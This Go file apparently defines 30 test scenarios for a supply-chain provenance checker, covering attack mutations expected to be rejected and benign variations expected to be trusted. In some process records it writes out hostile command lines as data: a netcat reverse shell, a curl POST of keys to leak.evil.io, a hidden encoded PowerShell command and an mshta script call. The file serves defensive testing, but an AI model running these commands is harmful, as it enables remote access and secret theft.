package generalization

import (
	"fmt"
	"time"

	"github.com/ramKarthik57/provenancex/internal/artifact"
	"github.com/ramKarthik57/provenancex/internal/correlation"
	"github.com/ramKarthik57/provenancex/internal/dependency"
	"github.com/ramKarthik57/provenancex/internal/environment"
	"github.com/ramKarthik57/provenancex/internal/evidence"
	"github.com/ramKarthik57/provenancex/internal/execution"
	"github.com/ramKarthik57/provenancex/internal/filesystem"
	"github.com/ramKarthik57/provenancex/internal/network"
	"github.com/ramKarthik57/provenancex/internal/process"
	"github.com/ramKarthik57/provenancex/internal/provenance"
	"github.com/ramKarthik57/provenancex/internal/remediation"
	"github.com/ramKarthik57/provenancex/internal/repository"
	"github.com/ramKarthik57/provenancex/internal/sbom"
	"github.com/ramKarthik57/provenancex/internal/signature"
)

// CloneInput performs a deep copy of a base CorrelationInput
func CloneInput(in *correlation.CorrelationInput) *correlation.CorrelationInput {
	out := remediation.MakeBaseClean()

	if in.Repository != nil {
		out.Repository = &repository.State{
			Branch:          in.Repository.Branch,
			CommitSHA:       in.Repository.CommitSHA,
			TreeSHA:         in.Repository.TreeSHA,
			Author:          in.Repository.Author,
			AuthorEmail:     in.Repository.AuthorEmail,
			CommitTimestamp: in.Repository.CommitTimestamp,
			IsClean:         in.Repository.IsClean,
			UntrackedFiles:  append([]string{}, in.Repository.UntrackedFiles...),
			ModifiedFiles:   append([]string{}, in.Repository.ModifiedFiles...),
		}
		if in.Repository.SignatureInfo != nil {
			out.Repository.SignatureInfo = &repository.CommitSignatureInfo{
				Status:         in.Repository.SignatureInfo.Status,
				SignerKeyID:    in.Repository.SignatureInfo.SignerKeyID,
				SignerIdentity: in.Repository.SignatureInfo.SignerIdentity,
				Committer:      in.Repository.SignatureInfo.Committer,
				CommitterEmail: in.Repository.SignatureInfo.CommitterEmail,
				Error:          in.Repository.SignatureInfo.Error,
			}
		}
	}

	if in.Dependencies != nil {
		out.Dependencies = &dependency.Report{
			DirectCount:  in.Dependencies.DirectCount,
			HasLockfile:  in.Dependencies.HasLockfile,
			IsConsistent: in.Dependencies.IsConsistent,
			Dependencies: make([]*dependency.Dependency, len(in.Dependencies.Dependencies)),
			Mismatches:   make([]*dependency.Mismatch, len(in.Dependencies.Mismatches)),
		}
		copy(out.Dependencies.Dependencies, in.Dependencies.Dependencies)
		copy(out.Dependencies.Mismatches, in.Dependencies.Mismatches)
	}

	if in.Environment != nil {
		out.Environment = &environment.Fingerprint{
			OS:              in.Environment.OS,
			Architecture:    in.Environment.Architecture,
			FingerprintHash: in.Environment.FingerprintHash,
			EnvironmentVars: make(map[string]string),
		}
		for k, v := range in.Environment.EnvironmentVars {
			out.Environment.EnvironmentVars[k] = v
		}
	}

	if in.Execution != nil {
		out.Execution = &execution.StageExecution{
			Name:      in.Execution.Name,
			Success:   in.Execution.Success,
			ExitCode:  in.Execution.ExitCode,
			Duration:  in.Execution.Duration,
			StartTime: in.Execution.StartTime,
			EndTime:   in.Execution.EndTime,
		}
	}

	if in.ProcessTree != nil {
		out.ProcessTree = &process.Tree{
			SuspiciousCount: in.ProcessTree.SuspiciousCount,
			Processes:       make([]*process.ProcessNode, len(in.ProcessTree.Processes)),
		}
		for i, p := range in.ProcessTree.Processes {
			out.ProcessTree.Processes[i] = &process.ProcessNode{
				PID:          p.PID,
				ParentPID:    p.ParentPID,
				Name:         p.Name,
				CommandLine:  p.CommandLine,
				IsSuspicious: p.IsSuspicious,
			}
		}
	}

	if in.InputEvaluation != nil {
		out.InputEvaluation = &filesystem.InputEvaluation{
			ExpectedInputs:      append([]string{}, in.InputEvaluation.ExpectedInputs...),
			ObservedInputs:      append([]string{}, in.InputEvaluation.ObservedInputs...),
			UnexpectedInputs:    append([]string{}, in.InputEvaluation.UnexpectedInputs...),
			MissingInputs:       append([]string{}, in.InputEvaluation.MissingInputs...),
			OutOfBoundaryWrites: append([]string{}, in.InputEvaluation.OutOfBoundaryWrites...),
		}
	}

	if in.NetworkAudit != nil {
		out.NetworkAudit = &network.Evaluation{
			TotalConnections:  in.NetworkAudit.TotalConnections,
			ViolationCount:    in.NetworkAudit.ViolationCount,
			IsPolicyCompliant: in.NetworkAudit.IsPolicyCompliant,
			Violations:        make([]*network.ConnectionRecord, len(in.NetworkAudit.Violations)),
			DNSQueries:        make([]*network.DNSQueryRecord, len(in.NetworkAudit.DNSQueries)),
		}
		copy(out.NetworkAudit.Violations, in.NetworkAudit.Violations)
		copy(out.NetworkAudit.DNSQueries, in.NetworkAudit.DNSQueries)
	}

	if in.Artifact != nil {
		out.Artifact = &artifact.Metadata{
			Name:   in.Artifact.Name,
			SHA256: in.Artifact.SHA256,
			Size:   in.Artifact.Size,
		}
	}

	if in.SBOM != nil {
		out.SBOM = &sbom.Document{
			Format:     in.SBOM.Format,
			Version:    in.SBOM.Version,
			Components: make([]*sbom.Component, len(in.SBOM.Components)),
		}
		for i, c := range in.SBOM.Components {
			out.SBOM.Components[i] = &sbom.Component{
				Name:    c.Name,
				Version: c.Version,
			}
		}
	}

	if in.Provenance != nil {
		out.Provenance = &provenance.InTotoStatement{
			Type:          in.Provenance.Type,
			PredicateType: in.Provenance.PredicateType,
			Subject:       make([]provenance.Subject, len(in.Provenance.Subject)),
		}
		for i, s := range in.Provenance.Subject {
			out.Provenance.Subject[i] = provenance.Subject{
				Name:   s.Name,
				Digest: make(map[string]string),
			}
			for k, v := range s.Digest {
				out.Provenance.Subject[i].Digest[k] = v
			}
		}
	}

	if in.Signature != nil {
		out.Signature = &signature.VerificationResult{
			Valid:       in.Signature.Valid,
			Algorithm:   in.Signature.Algorithm,
			KeyID:       in.Signature.KeyID,
			Distinction: in.Signature.Distinction,
		}
	}

	return out
}

// GetAllScenarios returns the complete set of 30 scenarios for Day 14
func GetAllScenarios() []*Scenario {
	scenarios := make([]*Scenario, 0)

	// =========================================================================
	// 1. UNSEEN ATTACK VARIANTS (22 Scenarios)
	// =========================================================================

	// Attack 1: Multi-File Source Tampering
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-01",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Source: Multi-File In-Tree Tampering",
		Description:     "Simultaneous uncommitted modifications across 5 core source files",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerSource,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Repository.IsClean = false
			c.Repository.ModifiedFiles = []string{
				"pkg/auth/token.go",
				"pkg/crypto/cipher.go",
				"pkg/session/manager.go",
				"cmd/server/main.go",
				"internal/config/loader.go",
			}
			return c
		},
	})

	// Attack 2: Delayed Background Process Execution
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-02",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Process: Asynchronous Post-Build Injection",
		Description:     "Suspicious background process spawned as detached worker",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerProcess,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.ProcessTree.SuspiciousCount++
			c.ProcessTree.Processes = append(c.ProcessTree.Processes, &process.ProcessNode{
				PID:          9944,
				ParentPID:    1,
				Name:         "powershell.exe",
				CommandLine:  "powershell.exe -NoP -NonI -W Hidden -Enc SUVY...",
				IsSuspicious: true,
				AlertReason:  "Unmonitored detached process execution",
			})
			return c
		},
	})

	// Attack 3: Deep Transitive Dependency Substitution
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-03",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Dependency: Deep Transitive Lockfile Tampering",
		Description:     "Transitive dependency mutated 4 levels deep in resolution tree",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerDependencies,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Dependencies.IsConsistent = false
			c.Dependencies.Mismatches = append(c.Dependencies.Mismatches, &dependency.Mismatch{
				Package:     "libxml2-bindings",
				Expected:    "2.9.14",
				Observed:    "2.9.14-pwned",
				Description: "Transitive dependency version altered in lockfile",
			})
			return c
		},
	})

	// Attack 4: Causal Timeline Reversal
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-04",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Temporal: Causal Build Inversion",
		Description:     "Artifact generation timestamp precedes compiler invocation start",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerBuild,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Execution.Success = false
			c.Execution.ExitCode = 1
			c.Execution.Error = "Temporal violation: build artifact generated before compilation process invoked"
			return c
		},
	})

	// Attack 5: Split-Brain Architecture Lockfile Divergence
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-05",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Dependency: Architecture Hash Mismatch",
		Description:     "Lockfile checksum mismatch for target execution architecture",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerDependencies,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Dependencies.IsConsistent = false
			c.Dependencies.Mismatches = append(c.Dependencies.Mismatches, &dependency.Mismatch{
				Package:     "native-accel-arm64",
				Expected:    "sha256-11112222333344445555666677778888",
				Observed:    "sha256-deadbeefdeadbeefdeadbeefdeadbeef",
				Description: "Integrity hash mismatch for architecture binary",
			})
			return c
		},
	})

	// Attack 6: Semantic Source Mutation with Intact Metadata
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-06",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Source: Subtle Logic Tampering",
		Description:     "Core authentication check bypassed while git log metadata is forged",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerSource,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Repository.UntrackedFiles = []string{"internal/auth/backdoor.go"}
			c.Repository.IsClean = false
			return c
		},
	})

	// Attack 7: Compiler Argument Injection via Environment
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-07",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Environment: Malicious Compiler Flags",
		Description:     "CGO_CFLAGS injecting malicious preprocessor macros",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerBuild,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Execution.Success = false
			c.Execution.ExitCode = 137
			c.Execution.Error = "Unauthorized compiler argument injected via CGO_CFLAGS"
			return c
		},
	})

	// Attack 8: Environment Drift Inducing Non-Reproducibility
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-08",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Artifact: Non-Deterministic Artifact Divergence",
		Description:     "Rebuild produces bitwise divergent artifact due to locale injection",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerArtifact,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Artifact.SHA256 = "deadbeef98fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
			return c
		},
	})

	// Attack 9: Auxiliary Payload Side-Loading
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-09",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Artifact: Side-Loaded Unverified Binary",
		Description:     "Primary artifact hash altered while size remains calibrated",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerArtifact,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Artifact.SHA256 = fmt.Sprintf("badc0de%057x", seed)
			return c
		},
	})

	// Attack 10: In-Toto Attestation Subject Hash Mismatch
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-10",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Provenance: Subject Hash Forgery",
		Description:     "SLSA provenance attestation claims hash of unbuilt artifact",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerArtifact,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Provenance.Subject[0].Digest["sha256"] = "1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff"
			return c
		},
	})

	// Attack 11: SLSA Predicate Materials Tampering
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-11",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Provenance: Incomplete Materials Ledger",
		Description:     "Provenance omits critical upstream dependency package",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerProvenance,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Provenance.Subject = []provenance.Subject{} // Empty subject fails provenance check
			return c
		},
	})

	// Attack 12: Ephemeral Orphaned Process Spawning
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-12",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Process: Detached Netcat Exfiltration",
		Description:     "Kernel ETW catches short-lived nc.exe subprocess executing in 2ms",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerProcess,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.ProcessTree.SuspiciousCount++
			c.ProcessTree.Processes = append(c.ProcessTree.Processes, &process.ProcessNode{
				PID:          7712,
				ParentPID:    1001,
				Name:         "nc.exe",
				CommandLine:  "nc.exe 198.51.100.23 4444 -e cmd.exe",
				IsSuspicious: true,
				AlertReason:  "Unauthorized network utility invocation",
			})
			return c
		},
	})

	// Attack 13: In-Memory Script Injection Without Disk Writes
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-13",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Process: Suspicious Execution Pattern",
		Description:     "Process telemetry detects suspicious base64 cmdline execution",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerProcess,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.ProcessTree.SuspiciousCount++
			c.ProcessTree.Processes = append(c.ProcessTree.Processes, &process.ProcessNode{
				PID:          4020,
				ParentPID:    1001,
				Name:         "cmd.exe",
				CommandLine:  "cmd.exe /c echo evil | mshta vbscript:...",
				IsSuspicious: true,
				AlertReason:  "Suspicious script engine execution",
			})
			return c
		},
	})

	// Attack 14: TOCTOU Artifact Replacement Post-Build
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-14",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Artifact: Post-Build In-Place Tampering",
		Description:     "Final artifact binary swapped with backdoored payload after stage exit",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerArtifact,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Artifact.SHA256 = "c0debad000000000000000000000000000000000000000000000000000000000"
			c.Artifact.Size = 4096
			return c
		},
	})

	// Attack 15: Rekor Transparency Log Replay
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-15",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Signature: Log Entry Replay Attack",
		Description:     "Cryptographic signature verification fails due to invalid key identity",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerSignature,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Signature = &signature.VerificationResult{
				Valid:       false,
				Algorithm:   signature.AlgoEd25519,
				KeyID:       "EXPIRED-KEY-9999",
				Error:       "signature verification failed: key expired or replayed",
				Distinction: signature.ArtifactTypeSignature,
			}
			return c
		},
	})

	// Attack 16: Sigstore Fulcio Identity Mismatch
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-16",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Signature: Untrusted OIDC Principal",
		Description:     "Signature is mathematically valid but issued to unapproved email",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerSignature,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Signature = &signature.VerificationResult{
				Valid:       false,
				Algorithm:   signature.AlgoECDSAP256,
				KeyID:       "FULCIO-KEY-1122",
				Error:       "OIDC principal mismatch: unauthorized@unapproved-domain.com",
				Distinction: signature.ArtifactTypeSignature,
			}
			return c
		},
	})

	// Attack 17: SBOM CycloneDX Component Version Drift
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-17",
		Category:        CategoryUnseenAttack,
		SubCategory:     "SBOM: Manifest Version Discrepancy",
		Description:     "SBOM component version differs from resolved dependency version",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerSBOM,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.SBOM.Components = []*sbom.Component{
				{Name: "cryptography", Version: "41.0.0-unverified"},
			}
			return c
		},
	})

	// Attack 18: SPDX Declared License Field Stripping
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-18",
		Category:        CategoryUnseenAttack,
		SubCategory:     "SBOM: Corrupted Specification Format",
		Description:     "SBOM metadata missing required dependency components",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerSBOM,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.SBOM.Components = []*sbom.Component{}
			return c
		},
	})

	// Attack 19: Git Commit Tree SHA Mismatch
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-19",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Source: Git Tree Object Mutation",
		Description:     "Cryptographic signature check detects bad/corrupted git tree",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerSignature,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Repository.SignatureInfo.Status = repository.CommitSignatureInvalid
			c.Repository.SignatureInfo.Error = "gpg: BAD signature from key 4A8B9C0D1E2F3A4B"
			return c
		},
	})

	// Attack 20: Out-of-Workspace Intermediate File Leak
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-20",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Filesystem: Expanded Boundary Write Escape",
		Description:     "Build script drops backdoor into %TEMP% directory",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerFilesystem,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.InputEvaluation.OutOfBoundaryWrites = []string{"C:\\Users\\Runner\\AppData\\Local\\Temp\\injected_hook.dll"}
			return c
		},
	})

	// Attack 21: Secondary Payload Execution in Build Script
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-21",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Network: Unauthorized DNS Exfiltration",
		Description:     "Build triggers unauthorized DNS TXT request to exfiltrate secret",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerNetwork,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.NetworkAudit.ViolationCount++
			c.NetworkAudit.IsPolicyCompliant = false
			c.NetworkAudit.DNSQueries = append(c.NetworkAudit.DNSQueries, &network.DNSQueryRecord{
				QueryDomain: "exfil.badactor.org",
				QueryType:   "TXT",
				IsAllowed:   false,
				AlertReason: "Unauthorized DNS TXT exfiltration channel",
			})
			return c
		},
	})

	// Attack 22: Binary PE/ELF Header Metadata Stripping
	scenarios = append(scenarios, &Scenario{
		ID:              "UNSEEN-ATK-22",
		Category:        CategoryUnseenAttack,
		SubCategory:     "Artifact: Binary Checksum Tampering",
		Description:     "Artifact payload altered, corrupting SHA-256 digest",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerArtifact,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Artifact.SHA256 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
			return c
		},
	})

	// =========================================================================
	// 2. COMPOSED MULTI-LAYER ATTACKS (3 Scenarios)
	// =========================================================================

	// Composed Attack 1: 2-Layer (Source + Dependency)
	scenarios = append(scenarios, &Scenario{
		ID:              "COMPOSED-ATK-01",
		Category:        CategoryComposedAttack,
		SubCategory:     "2-Layer: Source + Dependency Attack",
		Description:     "Simultaneous uncommitted source edits and dependency version drift",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerDependencies,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Repository.IsClean = false
			c.Repository.ModifiedFiles = []string{"pkg/auth/login.go"}
			c.Dependencies.IsConsistent = false
			c.Dependencies.Mismatches = append(c.Dependencies.Mismatches, &dependency.Mismatch{
				Package:     "cryptography",
				Expected:    "42.0.5",
				Observed:    "42.0.4-malicious",
				Description: "Version mismatch between declared and locked",
			})
			return c
		},
	})

	// Composed Attack 2: 3-Layer (Source + Dependency + Process)
	scenarios = append(scenarios, &Scenario{
		ID:              "COMPOSED-ATK-02",
		Category:        CategoryComposedAttack,
		SubCategory:     "3-Layer: Source + Dependency + Process Attack",
		Description:     "Source modified, dependency substituted, and suspicious process executed",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerDependencies,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Repository.IsClean = false
			c.Repository.ModifiedFiles = []string{"pkg/auth/login.go"}
			c.Dependencies.IsConsistent = false
			c.Dependencies.Mismatches = append(c.Dependencies.Mismatches, &dependency.Mismatch{
				Package:     "cryptography",
				Expected:    "42.0.5",
				Observed:    "42.0.4-malicious",
				Description: "Version mismatch between declared and locked",
			})
			c.ProcessTree.SuspiciousCount++
			c.ProcessTree.Processes = append(c.ProcessTree.Processes, &process.ProcessNode{
				PID:          8821,
				ParentPID:    1001,
				Name:         "curl.exe",
				CommandLine:  "curl.exe -X POST https://leak.evil.io/keys",
				IsSuspicious: true,
				AlertReason:  "Unauthorized network egress",
			})
			return c
		},
	})

	// Composed Attack 3: 4-Layer (Source + Dependency + Process + Artifact)
	scenarios = append(scenarios, &Scenario{
		ID:              "COMPOSED-ATK-03",
		Category:        CategoryComposedAttack,
		SubCategory:     "4-Layer: Full Multi-Stage Chain Attack",
		Description:     "Compromised source, rogue dependency, malicious process, and altered binary",
		IsAttack:        true,
		ExpectedVerdict: "REJECTED",
		ExpectedLayer:   evidence.LayerDependencies,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Repository.IsClean = false
			c.Repository.ModifiedFiles = []string{"pkg/auth/login.go"}
			c.Dependencies.IsConsistent = false
			c.Dependencies.Mismatches = append(c.Dependencies.Mismatches, &dependency.Mismatch{
				Package:     "cryptography",
				Expected:    "42.0.5",
				Observed:    "42.0.4-malicious",
				Description: "Version mismatch between declared and locked",
			})
			c.ProcessTree.SuspiciousCount++
			c.ProcessTree.Processes = append(c.ProcessTree.Processes, &process.ProcessNode{
				PID:          8821,
				ParentPID:    1001,
				Name:         "curl.exe",
				CommandLine:  "curl.exe -X POST https://leak.evil.io/keys",
				IsSuspicious: true,
				AlertReason:  "Unauthorized network egress",
			})
			c.Artifact.SHA256 = "beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeef"
			return c
		},
	})

	// =========================================================================
	// 3. BENIGN VARIABILITY SCENARIOS (5 Scenarios)
	// =========================================================================

	// Benign 1: Compiler Minor Patch Update (Harmless)
	scenarios = append(scenarios, &Scenario{
		ID:              "BENIGN-VAR-01",
		Category:        CategoryBenignVariability,
		SubCategory:     "Compiler: Harmless Minor Patch Update",
		Description:     "Compiler version bumped from Go 1.23.5 to Go 1.23.6 with identical artifact",
		IsAttack:        false,
		ExpectedVerdict: "TRUSTED",
		ExpectedLayer:   evidence.LayerEnvironment,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Environment.EnvironmentVars["GO_VERSION"] = "go1.23.6"
			return c
		},
	})

	// Benign 2: Harmless Lockfile Reformatting (Whitespace/Key Reordering)
	scenarios = append(scenarios, &Scenario{
		ID:              "BENIGN-VAR-02",
		Category:        CategoryBenignVariability,
		SubCategory:     "Dependency: Harmless Lockfile Formatting",
		Description:     "Lockfile whitespace formatting change with identical resolved versions",
		IsAttack:        false,
		ExpectedVerdict: "TRUSTED",
		ExpectedLayer:   evidence.LayerDependencies,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Dependencies.HasLockfile = true
			c.Dependencies.IsConsistent = true
			return c
		},
	})

	// Benign 3: Build Cache Hit with Normalized Timestamps
	scenarios = append(scenarios, &Scenario{
		ID:              "BENIGN-VAR-03",
		Category:        CategoryBenignVariability,
		SubCategory:     "Execution: Cache Hit Normalization",
		Description:     "Build execution duration reduced to 100ms due to compiler cache hit",
		IsAttack:        false,
		ExpectedVerdict: "TRUSTED",
		ExpectedLayer:   evidence.LayerBuild,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Execution.Duration = 100 * time.Millisecond
			return c
		},
	})

	// Benign 4: Workspace Path Relocation without Semantic Changes
	scenarios = append(scenarios, &Scenario{
		ID:              "BENIGN-VAR-04",
		Category:        CategoryBenignVariability,
		SubCategory:     "Environment: Path Relocation",
		Description:     "Project cloned into alternate directory path (e.g. /opt/agent/workspace)",
		IsAttack:        false,
		ExpectedVerdict: "TRUSTED",
		ExpectedLayer:   evidence.LayerEnvironment,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Environment.EnvironmentVars["WORKSPACE"] = "/opt/agent/workspace"
			return c
		},
	})

	// Benign 5: Harmless Git Tag / Annotation Update
	scenarios = append(scenarios, &Scenario{
		ID:              "BENIGN-VAR-05",
		Category:        CategoryBenignVariability,
		SubCategory:     "Source: Harmless Metadata Update",
		Description:     "Clean branch tag update from v1.2.0 to v1.2.1-rc1 with valid signature",
		IsAttack:        false,
		ExpectedVerdict: "TRUSTED",
		ExpectedLayer:   evidence.LayerSource,
		Mutate: func(base *correlation.CorrelationInput, seed int) *correlation.CorrelationInput {
			c := CloneInput(base)
			c.Repository.Branch = "v1.2.1-rc1"
			return c
		},
	})

	return scenarios
}
